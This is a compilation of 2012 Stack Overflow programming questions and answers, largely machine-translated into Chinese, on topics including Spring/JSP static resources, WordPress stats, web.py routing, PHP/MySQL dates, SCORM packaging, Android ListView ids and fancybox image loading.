> 时间：2012-11-04T18:17:38.200

如果用户是 root，他可以访问 db 文件，我已经做了几次。您可以将资源保存在 raw 文件夹中，然后从那里获取它们。

您可以在此处阅读有关资源的更多信息：

[http://developer.android.com/guide/topics/resources/providing-resources.html](http://developer.android.com/guide/topics/resources/providing-resources.html)

# java - Not able to link CSS and images

> ID：13221421
> 
> 赞同：1
> 
> 时间：2012-11-04T18:15:36.740
> 
> 标签：java, css, spring, jsp, spring-security

I am working on a Spring, Hibernate, JSP application. I am trying to display an image from my JSP page. The image not displayed on the browser. I am also not able to link my CSS into JSP page.

My JSP page is:

```
<%@ page contentType="text/html;charset=UTF-8"%>
<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>
<html>
<head>
<link href="css/style.css" rel="stylesheet" type="text/css" />
</head>
<body id="page1">
<div class="headerlogo" align="center"><a href=""><img src="images/Logo1.png" alt="" /></a></div>
<div align="center">
    <h1><spring:message code="header.title"/></h1>
    Language :
    <a href="?lang=en_US">English</a>|
    <a href="?lang=sp_SP">Spanish</a>

    <h3>
        <a href="home"><spring:message code="header.gotohome" /> </a>
    </h3>
</div>
</body>
</html> 
```

I have set

```
<http pattern="/images/**" security="none" />
<http pattern="/css/**" security="none" /> 
```

for my images and CSS folders

My Spring Security xml is:

```
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/security"
    xmlns:beans="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans-3.1.xsd
http://www.springframework.org/schema/security
http://www.springframework.org/schema/security/spring-security-3.1.xsd">

    <http pattern="/images/**" security="none" />
    <http pattern="/css/**" security="none" />

    <http auto-config="true" use-expressions="true">

        <intercept-url pattern="/admin*" access="hasRole('SYS_ADMIN')" />

        <form-login login-page="/login" default-target-url="/role-check"
            authentication-failure-url="/login?error=true" />
        <logout logout-success-url="/login" />

         </http> 

         <authentication-manager> 
        <authentication-provider> 

        <jdbc-user-service data-source-ref="fmsDataSource"  
        users-by-username-query="select USERNAME,PASSWORD, 'true' as enabled from users where USERNAME=?"
        authorities-by-username-query="select u.USERNAME, ur.AUTHORITY from users u, user_roles ur where u.USER_ID = ur.USER_ID and u.USERNAME =? " />
    </authentication-provider>
    </authentication-manager>
</beans:beans> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-05T13:49:27.773

我通过在`web.xml`文件中添加以下映射解决了这个问题

```
<servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>*.css</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>*.js</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>*.gif</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>*.jpg</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>*.png</url-pattern>
    </servlet-mapping> 
```

并且还通过添加`<%=request.getContextPath()%>`图像 src url。喜欢`<img src="<%=request.getContextPath()%>/images/logo.png" />`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:23:34.483

You could use JSTL `<link href="<c:url value='/css/style.css'/>"` tag for this the same shoult do for images. `<img src="<c:url value='/images/Logo1.png'/>"`.

You also need to add to the page

```
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %> 
```

# php - stats_get_csv（Wordpress Stats）只显示热门帖子（不是页面）

> ID：13221428
> 
> 赞同：0
> 
> 时间：2012-11-04T18:16:32.240
> 
> 标签：php, wordpress, statistics

我正在尝试通过 Wordpress Stats（现在称为 Jetpack）获取基于页面浏览量的前 10 个帖子。在论坛上挖了几个小时后，我设法让这段代码工作（大约..）（因为变量和代码不时改变）：

```
 <?php
        if ( function_exists('stats_get_csv') && $top_posts = stats_get_csv('postviews', 'days=-1&limit=10')) {
        echo '<ol class="most-viewed">';
          foreach ( $top_posts as $post ) {
            if($post['post_id'] && get_post($post['post_id']))
              echo '<li><a href="' . get_permalink( $post['post_id'] ) . '">' . 
                  get_the_title( $post['post_id'] ) . '</a> (' . number_format_i18n( $post['views']) .' visits)</li>';
          }
          echo '</ol>';
        }
        ?> 
```

现在我想从这个列表中排除页面并且只有帖子。问题是 WordPress.com Stats API 不提供 post_type 过滤器。我应该把这个放在某个地方

```
if ( !isset($post->post_type) || $post->post_type != 'post' ) 
```

你能帮我指出我应该在哪里添加它吗？

提前致谢！:D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:35:06.913

解决了：

```
if ( 
    $post['post_id'] 
    && get_post( $post['post_id'] ) 
    && 'post' === get_post_type( $post['post_id'] )
) 
```

# python - 基于 Web.Py 的应用程序，启动时没有问题，导航到 url "/" 时抛出 KeyError

> ID：13221433
> 
> 赞同：2
> 
> 时间：2012-11-04T18:17:08.440
> 
> 标签：python, web.py

我正在尝试让我的一个麻烦的 python 应用程序工作。我刚刚通过@unutbu [here](https://stackoverflow.com/questions/13221021/cannot-get-imports-to-work-in-web-py-project/13221195#comment18006635_13221195)的帮助克服了一个问题。

我的下一个问题是有点奇怪，堆栈跟踪显示与我的代码无关：

```
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/web.py-0.37-py2.7.egg/web/application.py", line 239, in process
    return self.handle()
  File "/usr/local/lib/python2.7/dist-packages/web.py-0.37-py2.7.egg/web/application.py", line 230, in handle
    return self._delegate(fn, self.fvars, args)
  File "/usr/local/lib/python2.7/dist-packages/web.py-0.37-py2.7.egg/web/application.py", line 419, in _delegate
    cls = fvars[f]
KeyError: u'Home' 
```

我调用 web.py 函数的唯一脚本是：

```
#Application/App.py
import web
class AppInstance(object):
    def __init__(self):
        from Views import Home
        self.urls = (
                "/", "Home",
                )
        self.app = web.application(self.urls, globals())
    def run(self):
        self.app.run() 
```

这个人从文件系统中的上层目录的脚本中调用：

```
#start.py
from Application import App
app = App.AppInstance()
app.run() 
```

如果你愿意，我可以从我上面提到的问题中复制目录布局的外观，但我现在不这样做，因为它会在这里造成很多混乱（树命令的输出）。我的问题是：*如何通过对目录结构的最小更改来解决此问题？*

* * *

我认为添加应用程序的目录结构应该有助于那些想要帮助/可能会阅读本文以解决他们自己的问题的人。

```
Blog/
├── Application/
│   ├── App.py
│   └── __init__.py
|
├── Engine/
│   ├── Connection/
│   │   ├── __init__.py
│   │   └── MySQLConnection.py
│   ├── Errors.py
│   └── __init__.py
├── __init__.py
├── Models/
│   ├── BlogPostModel.py
│   └── __init__.py
├── start.py
└── Views/
    ├── Home.py
    └── __init__.py 
```

这件事刚刚开始，旨在提供一个博客引擎，并帮助我实现我今天学到的东西，以获得完整和有用的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:35:24.750

的第二个参数[`web.application`](http://webpy.org/docs/0.3/api#web.application)必须是潜在处理程序的字典。在您的情况下，您想`Home`加入其中，但该绑定仅在局部变量中。要么调用[`locals`](http://docs.python.org/3/library/functions.html#locals)而不是`globals`：

```
import web
class AppInstance(object):
    def __init__(self):
        from Views import Home
        self.urls = (
                "/", "Home",
                )
        self.app = web.application(self.urls, locals())
        #                                     ^^^^^^
    def run(self):
        self.app.run() 
```

或移动导入：

```
import web
from Views import Home # <-- Moved into global namespace
class AppInstance(object):
    def __init__(self):
        self.urls = (
                "/", "Home",
                )
        self.app = web.application(self.urls, globals())
    def run(self):
        self.app.run() 
```

# matlab - Combining two independent columns based on criteria of one (matlab)

> ID：13221434
> 
> 赞同：0
> 
> 时间：2012-11-04T18:17:11.163
> 
> 标签：matlab, matrix, lookup, zero

I have a column of values which outputs like the following:

```
d =

 1
 1
 3
 1
 1
 2
 1 
```

I am looking to combine the integers that are > 0 to the following:

```
e =

 1
 2
 3
 4
 5
 6
 7
 8
 9
10 
```

So for instance the first value is 1 so it would only be assigned to one value in e (the first). I am looking to have an unique identifier for each separate value to output this:

```
e =

 1   1
 2   2
 3   3
 4   3
 5   3
 6   4
 7   5
 8   6
 9   6
10   7 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-26T15:12:31.543

这是一个使用`bsxfun`

```
e = [e 1+sum(bsxfun(@gt, 1:sum(d),cumsum(d))).']; 
```

# php - 如何在 PHP 中回显 mysql CURRENT_DATE()？

> ID：13221437
> 
> 赞同：1
> 
> 时间：2012-11-04T18:17:38.140
> 
> 标签：php, mysql

我想比较PHP：

```
$now = date('Y-d-m H:i:s'); 
```

用 mysql`CURRENT_DATE()`和`die();`

我需要检查 mysql`current_date`是否与`$now`.

但是，我不知道该怎么做。我可能也需要进行一些格式更改，`CURRENT_DATE()`以便将其与`$now = date('Y-d-m H:i:s');`

这可能吗？

如果是，php 代码会是什么样子？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:19:46.890

在 MySQL 中`CURDATE()`，根据函数中使用的是数字还是字符串，以 'YYYY-MM-DD' 格式或 'YYYYMMDD' 格式返回当前日期。

`CURRENT_DATE`并且`CURRENT_DATE()`是 的同义词`CURDATE()`。

```
SELECT CURDATE(); 
```

![在此处输入图像描述](../Images/dbbaecdaba1b22db36e9fdd926ff6a92.png)

**MySql 示例 - curdate() 函数**

```
$result = mysql_query("SELECT CURDATE()");
while($row=mysql_fetch_array($result))
{ 
echo $row['CURDATE()'] ;
} 
```

**MySql 示例 - 数字格式的 curdate() 函数**

```
$result = mysql_query("SELECT CURDATE()+1");
while($row=mysql_fetch_array($result))
{

echo $row['CURDATE()+1'];

} 
```

我只使用了 mysql_* 函数，因为我明白我不建议使用 mysql_* 函数

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:42:18.577

您基本上可以使用 strtotime 将 MYSQL 返回的日期转换为 Unix 时间戳，然后将其与时间进行比较：

```
$q = "SELECT CURRENT_DATE() date";
$res = mysql_query($q);
$row = mysql_fetch_assoc($res);
if(time() == strtotime($res['date'])) // dates are equal, proceded with your logic 
```

或者如果你愿意，你也可以这样做有点奇怪：

```
if (strtotime(date("Y-m-d H:i:s")) == strtotime($row['date'])) 
```

但第一个版本会更干净

# flash - 将一组 flash 文件转换为 moodle 的 SCORM 包

> ID：13221438
> 
> 赞同：0
> 
> 时间：2012-11-04T18:17:57.203
> 
> 标签：flash, moodle, scorm

我有一组嵌入到一个 html 文件中的 flash 文件。无论如何，我可以将其转换为 SCORM 包以在 Moodle 中使用。或者有没有更好的方法将其作为课程嵌入到 moodle LMS 中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T17:33:55.143

您可以将其转换为 SCORM 包。我不知道在 Moodle 中是否有更好的方法。

要创建 SCORM 包，请将所有文件放入 zip 中，并添加一个 imsManifest.xml 文件，该 xml 文件的内容应类似于：

```
<?xml version="1.0" standalone="no"?>
<manifest identifier="Flash content" version="1.3" xmlns="http://www.imsglobal.org/xsd/imscp_v1p1" xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_v1p3" xmlns:adlseq="http://www.adlnet.org/xsd/adlseq_v1p3" xmlns:adlnav="http://www.adlnet.org/xsd/adlnav_v1p3" xmlns:imsss="http://www.imsglobal.org/xsd/imsss" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.imsglobal.org/xsd/imscp_v1p1 imscp_v1p1.xsd
                        http://www.adlnet.org/xsd/adlcp_v1p3 adlcp_v1p3.xsd
                        http://www.adlnet.org/xsd/adlseq_v1p3 adlseq_v1p3.xsd
                        http://www.adlnet.org/xsd/adlnav_v1p3 adlnav_v1p3.xsd
                        http://www.imsglobal.org/xsd/imsss imsss_v1p0.xsd">
  <metadata>
    <schema>ADL SCORM</schema>
    <schemaversion>CAM 1.3</schemaversion>
  </metadata>
  <resources>
    <resource identifier="Flash_content" type="webcontent" adlcp:scormType="sco" href="flashPlayer.html">
      <file href="FlashFile.swf" />
      <file href="AnotherFlash.swf" />
      <file href="FlashPlayer.html" />
    </resource>
  </resources>
</manifest> 
```

清单必须在 zip 根目录中，imsmanifest.xml 中的 href 是相对于文件本身的。我没有测试清单，所以，也许缺少一些东西，但你可以从那里开始。

希望这可以帮助。

# jquery - jQuery 检测 css 背景图片完成下载

> ID：13221440
> 
> 赞同：6
> 
> 时间：2012-11-04T18:18:02.070
> 
> 标签：jquery, css

我正在尝试下载图像，然后使用 css 应用淡入淡出`background-image`。
当它是这样的常规时，我可以做到这一点`<img src=''/>`：

```
#mainImg {display:none}

var c = $('#mainImg');
$(new Image()).load(function(){
    c.fadeIn(300);
}).attr('src', c.attr('src')); 
```

但是当它是一个时我怎么能检测到它`css background`？
这是使用 jQuery 的 css，但我似乎无法像上面的代码那样得到它并检测下载何时完成

```
$('<img/>').attr('src', 'image.png').load(function() {
     $('#mainImg').css('background-image', 'url(image.png)');
}); 
```

**编辑**这有帮助！ [如何检查是否加载了背景图像？](https://stackoverflow.com/questions/5057990/how-can-i-check-if-a-background-image-is-loaded) 谢谢@colin

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T13:31:18.803

我之前通过将隐藏的子图像临时附加到 div 来完成此操作，然后在子图像的加载事件触发时设置其父图像的背景图像并淡入。最好在事后删除子图像，以保持整洁！您可以将图像附加到任何地方，但这是一个映射应用程序，我必须保持图像与其父 div 相关联！

# android - 如何从 ListView 中的单个项目中烘烤特定的文本 ID

> ID：13221441
> 
> 赞同：0
> 
> 时间：2012-11-04T18:18:06.890
> 
> 标签：android, listview, rowid, onitemclick

我正在尝试开发一个 Android 应用程序，但我目前遇到了一些问题。

我使用如下所示的自定义列表视图：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:paddingLeft="20dp"
    android:paddingRight="20dp"
    android:paddingTop="10dp"
    android:paddingBottom="10dp" >

    <TextView
        android:id="@+id/name"
        style="@style/..."/>

    <TextView
        android:id="@+id/number"
        android:layout_below="@+id/..."
        style="@style/..." />

    <TextView
        android:id="@+id/id" 
        android:layout_below="@+id/..."
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:visibility="visible" />

</RelativeLayout> 
```

这里的 ID 从我的 SQLite 数据库中获取他们的文本，我通过我的联系人表查询。

现在，当我单击列表视图中显示的项目时，我希望发生一些事情。单击已注册，但现在我想要一个 Toast，它只显示正在传递到 ID 的数字。（每行的主键）。

我不能使用 arrayindex +1，因为我不按 id 对查询进行排序。

这是我的onItemClick：

```
contactList.setOnItemClickListener(new OnItemClickListener() {

        public void onItemClick(AdapterView<?> parent, View view, int position,
                long id) {

            Toast.makeText(Contacts.this,"My unique rowID should be presented here.",
                      Toast.LENGTH_SHORT).show();

        }

    }); 
```

我将唯一 ID 发送到 textview，因为我相信在单击特定项目时可以更轻松地提取该信息。

我的基本适配器：

```
public class ListViewCustomAdapter extends BaseAdapter {

    public ArrayList<String> name;
    public ArrayList<String> number;
    public ArrayList<String> id;

    public Activity context;

    public LayoutInflater inflater;

    public ListViewCustomAdapter(Activity context,
            ArrayList<String> name, ArrayList<String> number, ArrayList<String> id) {
        // TODO Auto-generated constructor stub
        super();
        this.context = context;
        this.name = name;
        this.number = number;
        this.id = id;

        this.inflater = (LayoutInflater) context
                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    public int getCount() {
        // TODO Auto-generated method stub
        return name.size();
    }

    public Object getItem(int position) {
        // TODO Auto-generated method stub
        return null;
    }

    public long getItemId(int id) {

        return id;
    }

    public class ViewHolder {
        TextView txtViewName;
        TextView txtViewNumber;
        TextView txtViewId;

    }

    public View getView(int position, View convertview, ViewGroup parent) {
        // TODO Auto-generated method stub

        ViewHolder holder;
        if (convertview == null) {
            holder = new ViewHolder();
            convertview = inflater.inflate(R.layout.listview_row, null);

            holder.txtViewName = (TextView) convertview
                    .findViewById(R.id.name);
            holder.txtViewNumber = (TextView) convertview
                    .findViewById(R.id.number);
            holder.txtViewId = (TextView) convertview
                    .findViewById(R.id.id);

            convertview.setTag(holder);
        } else {
            holder = (ViewHolder) convertview.getTag();
        }

        holder.txtViewName.setText(name.get(position));
        holder.txtViewNumber.setText(number.get(position));
        holder.txtViewId.setText(id.get(position));

        return convertview;
    }
} 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:24:19.073

> 现在我想要一个只显示正在传递到 ID 的数字的 Toast。（每行的主键）。

如果您想要数据库中的主键，（取决于适配器）它应该是`id`传递给的参数`onItemClick()`：

```
public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
    // Use id
    Toast.makeText(Contacts.this, id + "",Toast.LENGTH_SHORT).show();

    // Or you can find it yourself
    TextView idTV = (TextView) view.findViewById(R.id.id);
    Toast.makeText(Contacts.this, idTV.getText().toString(),Toast.LENGTH_SHORT).show();
} 
```

* * *

**添加**
现在您发布了您的适配器，我看到您可以调整您的`getItemId()`方法以从您的返回数据`ArrayList<String> id`以使`id`参数`onItemClick()`正常工作：

```
public long getItemId(int position) {
    return Long.parseLong(id.get(position));
} 
```

（如果在您的上下文中有意义，您甚至可以将容器类型从更改为`ArrayList<String>`。 ）`ArrayList<Long>`

# .net - StreamWriter 中的异常并写入文本文件

> ID：13221447
> 
> 赞同：0
> 
> 时间：2012-11-04T18:18:26.593
> 
> 标签：.net, vb.net, streamwriter

我正在尝试编写一个简单的文本文件编写器。

如果我在使用 writer 时抛出异常，它会自动关闭吗？

可以这样写吗，因为它可以工作并且只有三行。如果文件不存在，则添加它并将文本写入其中；如果它确实存在，那么它会附加文本吗？

我在网上找到的所有其他示例都太长太复杂了？

```
Try
    For index = 1 To 100 Step 1

        Dim filePath As String = "c:\TextFile2.txt"

        Using writer As New StreamWriter(filePath, True)
            writer.WriteLine("Important data line" & index)

            ''Throw New ArgumentException("Exception Occured")

        End Using
    Next

Catch ex As Exception

    Console.WriteLine(ex.Message)
    Console.ReadLine()
End Try 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:22:35.077

"using" is essentially a wrapping for a try/finally and dispose will be called as expected.

**EXAMPLE:**

```
WebClient c=new WebClient();
c.Disposed+= (sender, args) => {Console.WriteLine("DISPOSED");};
    using(c){
    throw new Exception("testing dispose");
    } 
```

# javascript - 使用链接更改图像

> ID：13221448
> 
> 赞同：0
> 
> 时间：2012-11-04T18:18:47.620
> 
> 标签：javascript, html

现在，我有一个简单的下拉菜单，其中包含“之前”和“之后”两个链接：

```
<img id="beforeAfter1" src="images/b2.jpg" width="580" height="435"/>
<div class="baDiv">
    <select class="baSelect" onchange="document.getElementById('beforeAfter1').src = this.value">
        <option value="images/b2.jpg">Before</option>
        <option value="images/a2.jpg">After</option>
    </select>
</div> 
```

当我单击其中一个链接时，主图像 src 会发生变化。我想将这些下拉列表转换为普通链接，`Before | After`但我不太确定如何做到这一点。

谁能帮我？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:22:25.613

Try this

```
<a href="#" onclick="document.getElementById('beforeAfter1').src = 'images/b2.jpg';">Before</a>
<a href="#" onclick="document.getElementById('beforeAfter1').src = 'images/a2,jpg';">After</a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:25:26.980

您可以使用 jQuery，例如：

```
<img id="beforeAfter1" src="images/b2.jpg" width="580" height="435"/>
<a id='before' value="images/b2.jpg">Before</a> |
<a id='after' value="images/a2.jpg">After</a>

<script>
$(document).ready(function(){
  $('#before').click(function(e) {
    e.preventDefault();
    $('#beforeAfter1').attr('src', 'images/b2.jpg');
  });
  $('#after').click(function(e) {
    e.preventDefault();
    $('#beforeAfter1').attr('src', 'images/a2.jpg');
  });
});
</script> 
```

# mongodb - 猫鼬聚合不起作用

> ID：13221451
> 
> 赞同：1
> 
> 时间：2012-11-04T18:18:49.137
> 
> 标签：mongodb, mongoose

Mongodb 2.2.0 和 mongoose [3.3.1](http://mongoosejs.com/)。

我正在尝试在以下查询上 运行[聚合：](http://mongoosejs.com/docs/api.html#model_Model-aggregate)

```
var db = mongoose.connect('localhost', 'test', '27017').connection;
var testSchema = new Schema;
var tr= db.model('tests', testSchema);  

tr.aggregate({'$group':{'_id':'$test_id', 'average':{$avg:'$tes_tscore'}}}) 
```

以下错误不断弹出：

```
TypeError: Object function model(doc, fields, skipId) {
    if (!(this instanceof model))
      return new model(doc, fields, skipId);
    Model.call(this, doc, fields, skipId);
  } has no method 'aggregate' 
```

猫鼬还不支持聚合还是我的代码缺少某些东西？

** 该`tests`集合有超过 1000 个文档。运行`tr.find(... console.log(...)`返回所需的文档。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T23:13:14.217

我解决了。

放入`console.log(mongoose.version);`脚本显示为过时版本（3.0.2）。

我重新浏览了这些模块（这次很小心）并删除并重新安装了`mongoose`.
版本 3.3.1，`aggregate`现在可以使用。

`aggregate`上线 v.3.1.0

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T05:15:07.963

在 3.x 中支持聚合。您示例中的代码看起来不错，但以某种方式`tr`引用了 model() 方法而不是模型实例。如果您能够始终如一地重新创建此问题，请使用要运行的确切代码打开票证，我们会修复它。

[https://github.com/LearnBoost/mongoose/issues/new](https://github.com/LearnBoost/mongoose/issues/new)

# javascript - 我想使用 javascript 或 jquery 更改内容

> ID：13221461
> 
> 赞同：1
> 
> 时间：2012-11-04T18:19:54.420
> 
> 标签：javascript, jquery, ajax, html, html-select

**选择课程**

```
<select>
    <option value="b.a">B.A</option>
    <option value="b.com">B.Com</option>
    <option value="b.b.a">B.B.A</option>
</select> 
```

**选择学期**

```
<option value="1">1st</option>
<option value="2">2nd</option>
<option value="3">3rd</option> 
```

现在我想要的是当我选择第一门课程时`b.a`。那就不要。学期数应仅显示在“选择学期”列表中，对于 b.com，这些应为 2，对于 bba，这些应为 3，即一旦选择课程，页面会自动刷新并且学期数会根据选择的主题，关于这个我如何使用 js 或 jquery 或 ajax 来完成这个，请通过提供一些示例或教程来帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:59:20.997

使用 jQuery 和 AJAX 的示例

> HTML

```
<select id="selPrimary">
    <option value="b.a">B.A</option>
    <option value="b.com">B.Com</option>
    <option value="b.b.a">B.B.A</option>
</select>
<select id="selSecondary"></select> 
```

> 脚本

```
// jQuery doc.ready function
$(function() { // all "action" script goes in here
    // Selects primary "select tag" by ID and assigns change event
    $("#selPrimary").on("change", function(e) {
        // Empty the options that might exist 
        // (from last choice in primary) and prep 
        // secondary for new options
        $("#selSecondary").empty();
        // .post is jQuery short hand for .ajax(..."type=post"
        $.post("someFolder/someController.php", // this first param tells location of your php backend controller
            function(data) { // this is the function that acts if the post is "successful"
                $("#selSecondary").html(data); //  fills secondary select tag with our new options
            },
            "json"); // this last param tells how to return the data
    });
}) 
```

> 控制器（本例中为 PHP）

```
$retValue = "";
//Get Post Variables. 
if (isset($_POST['selPrimary'])){
    $value = $_POST['selPrimary'];   
    switch($value) {
        case "b.a":
            $retValue = '<option value='1'>1st</option><option value='2'>2nd</option<option value='3'>3rd</option>';
            break;
        case "whatev":
            $retValue = '<option value='1'>1st</option><option value='2'>2nd</option<option value='3'>3rd</option>';
            break;
    }
}

echo json_encode($retValue); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:29:35.187

你可以试试这个...

```
<script>
function changeSem(sub)
{
 if(sub == 'b.a')
 {
  document.getElementById('sem').innerHTML = "<select id='semnum'>
<option value='1'>1st</option>
</select>";
 }
 if(sub == 'b.com')
 {
    document.getElementById('sem').innerHTML = "<select id='semnum'>
<option value='1'>1st</option>
<option value='2'>2nd</option>
</select>";
 }
 if(sub == 'b.b.a')
 {
    document.getElementById('sem').innerHTML = "<select id='semnum'>
<option value='1'>1st</option>
<option value='2'>2nd</option>
<option value='3'>3rd</option>
</select>";
 }
}
</script>
Select Course
<select id="sub" onchange="changeSem(this.value);">
<option value="b.a">B.A</option>
<option value="b.com">B.Com</option>
<option value="b.b.a">B.B.A</option>
</select> 
Select Semester
<div id="sem"></div> 
```

希望能帮助到你！

# mysql - 正则表达式 - 重命名 FTP 上的文件并重命名 MySQL 中的列值

> ID：13221462
> 
> 赞同：-1
> 
> 时间：2012-11-04T18:20:04.687
> 
> 标签：mysql, regex, ftp

用于清理文件名的正则表达式是`preg_replace('/[^\w\._]+/', '_', $fileName);`

我正在寻找一种方法来重命名 FTP 服务器上的目录中的文件*（FTP 客户端允许使用正则表达式进行批量重命名？或一些 php 脚本？）*使用该正则表达式。

此外，我想重命名 MySQL 中一列中所有行的值*（包括正则表达式的 sql 查询？）*，例如，如果该值是`http://test.com/content/plugins/audio/uploading/uploads/test song - test title 1.mp3`删除目录路径并保留基本名称，并使用相同的正则表达式重命名它。

输出应`test_song___test_title_1.mp3`在 FTP 和 MySQL 中。

不幸的是，我无法访问 SSH。

先感谢您！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T13:07:16.603

解决方案是使用[SmartFTP](http://www.smartftp.com/)，对于这项工作，我使用了它的功能[“批量重命名”](http://www.smartftp.com/client/features/bulkrename)。

然后对于 MySQL，我使用了这个查询：

```
UPDATE [table]
SET [column] = REPLACE([column], '!', '_'),
    [column] = REPLACE([column], '@', '_'),
    [column] = REPLACE([column], '#', '_'),
    /* add as many as you wish(the same ones as you put in smartftp bulk rename function) */
    [column] = REPLACE([column], '\'', '_'),
    [column] = REPLACE([column], '\\', '_') 
```

我希望它对某人有用。

# php - 图片有时不加载，如何确保它一直加载？花式盒

> ID：13221463
> 
> 赞同：-2
> 
> 时间：2012-11-04T18:20:13.330
> 
> 标签：php, javascript, jquery, html, fancybox

我使用fancybox，很少有一些图像不会加载给用户。如何确保图像一直加载，如果没有，我可以重新加载页面或其他什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T10:34:18.660

您应该首先找出这些图像未加载的原因。使用 FireFox 的 FireBug 等开发人员工具或其他人的内置工具来监控网络活动。状态列应指示是否存在与服务器端相关的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:34:39.673

您可以将图像的像素数据保存`x=1 y=1`到变量中，然后确保它匹配，如果它不重新加载它。这仅在用户具有 html5 画布支持时才有效。在我看来，让每个用户的浏览器都运行起来是一种不必要的工作量。

这将为您提供所需的信息：

```
var colorOfSomeImage = colorvalue
var imageData = ctx.getImageData(canvasX, canvasY, 1, 1);
var pixel = imageData.data;
imageExists = pixel == 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T18:25:04.580

`javascript`您可以执行以下操作来检查图像是否完全加载：

```
objImg = new Image();
objImg.src = 'photo.gif';
objImg.onload = function() {
                           /// do some work;
                        }
if(!objImg.complete)
 {
        /// do other work;
             } 
```

您还可以使用图像`onerror`事件，例如：

```
<img src="image.gif" onerror="handleError(this);"> 
function handleError(image){
    //do some thing else
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-12T22:42:56.973

您可以设置fancybox的错误模板：

```
$('.fancybox').fancybox({
    tpl: {error: '<script>window.location = window.location;</script>'}
}); 
```

这样，如果图像加载失败，错误模板会重新加载页面。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-11T18:48:35.780

这有点棘手。您可以使用 javascript 完成任务。构建一个函数说 loadImage：

```
$.fn.loadImage = function(fn){
    this.load(fn);
    this.each( function() {
        if ( this.complete && this.naturalWidth !== 0 ) {
            $(this).trigger('load');
        }
    });
} 
```

上面的代码还涵盖了图像在脚本执行之前完成加载的情况。当您在标记中定义图像时，可能会发生这种情况。

```
<img src='http://example.com/img.png'/> 
```

每当您想打开fancybox时触发以下javascript

```
$('img').loadImage(function(){
    //open fancybox
 }); 
```

无论你在做什么，祝你好运！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-16T04:22:18.497

正如 Janis 所指出的，使用您的开发人员工具来监控 Net 部分 - 这可能是服务器端问题。

还有一个问题，我之前曾多次涉及绑定了一个fancybox——这会导致它出现间歇性问题。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-16T08:32:03.833

**使用Fiddler / FireFug**或使用 Chrome 的内置工具监视网络请求（按 F12 并单击网络然后重新加载页面并监视），对图像 url 的请求是否正确以及它们是否被加载。我的意思是获得**200 OK 状态或 304 Not Modified(Cache)**

如果您遇到一些路径问题，请**尝试使用**“http://yoursite.com/images/img.jpg”之类的绝对路径并检查

确保您的服务器上存在所有图像，并且代理服务器没有阻止图像请求。

希望这会有所帮助！

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-11-18T11:27:48.097

您可以使用类将[`.error()`-Funktion](http://api.jquery.com/error/)添加到所有图像。然后向服务器发出 Ajax-Call 以检索丢失的源。

像这样的东西：

```
<img src="image.gif" class="imageClass"> 
```

进而：

```
$.each($(".imageClass"), function(index, obj){
 $(obj).error(function() {
  //Your Ajax-Call
 }));
}); 
```

[对于 Ajax 调用，请参阅 JQuery-Doc](http://api.jquery.com/jQuery.ajax/)。

# database - 将视图中的 db 数据返回给 doophp

> ID：13221465
> 
> 赞同：-2
> 
> 时间：2012-11-04T18:20:51.910
> 
> 标签：database, view, doophp

我想问 doophp 我可以通过什么方式将我的数据库数据从模型控制器返回到我的视图。

这是我的控制器：

```
`class CategoryController extends DooController { 
    public function Index(){ 
        Doo::loadModel('Category'); 
        $category = new Category; 
        Doo::db()->find( $category, array('limit'=>1) ); 
        $this->view()->render('Category/Index', $category); 
    } 
} 
```

